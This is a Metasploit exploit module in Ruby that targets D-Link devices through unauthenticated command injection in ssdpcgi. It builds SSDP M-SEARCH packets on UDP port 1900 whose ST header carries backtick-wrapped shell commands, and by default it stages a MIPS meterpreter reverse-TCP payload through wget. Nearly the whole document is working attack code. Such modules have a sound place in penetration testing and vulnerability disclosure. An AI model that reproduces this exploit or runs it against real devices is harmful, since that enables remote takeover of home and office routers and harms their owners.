##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi',
      'Description' => %q{
        D-Link Devices Unauthenticated Remote Command Execution in ssdpcgi.
      },
      'Author'      =>
        [
          's1kr10s',
          'secenv'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          # ['CVE', 'nada'],
          ['URL', 'https://medium.com/@s1kr10s/']
        ],
      'DisclosureDate' => 'Dec 24 2019',
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'        => ARCH_MIPSBE,
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'DefaultOptions' =>
        {
            'PAYLOAD' => 'linux/mipsbe/meterpreter_reverse_tcp',
            'CMDSTAGER::FLAVOR' => 'wget'
        },
      'Targets'        =>
        [
          [ 'urn',
            {
            'Arch' => ARCH_MIPSBE,
            'Platform' => 'linux'
            }
          ],
          [ 'uuid',
            {
            'Arch' => ARCH_MIPSBE,
            'Platform' => 'linux'
            }
          ]
        ],
      'CmdStagerFlavor' => %w{ echo printf wget },
      'DefaultTarget'  => 0
      ))

  register_options(
    [
      Opt::RHOST(),
      Opt::RPORT(1900)
    ], self.class)
  end

  def exploit
    execute_cmdstager(linemax: 1500)
  end

  def execute_command(cmd, opts)
    if target.name =~ /urn/
      print_status("Target Payload URN")
      val = "urn:device:1;`#{cmd}`"
    elsif target.name =~ /uuid/
      print_status("Target Payload UUID")
      val = "uuid:`#{cmd}`"
    end

    connect_udp
    header =
      "M-SEARCH * HTTP/1.1\r\n" +
      "Host:239.255.255.250:1900\r\n" +
      "ST:#{val}\r\n" +
      "Man:\"ssdp:discover\"\r\n" +
      "MX:2\r\n\r\n"
    udp_sock.put(header)
    disconnect_udp
  end
end
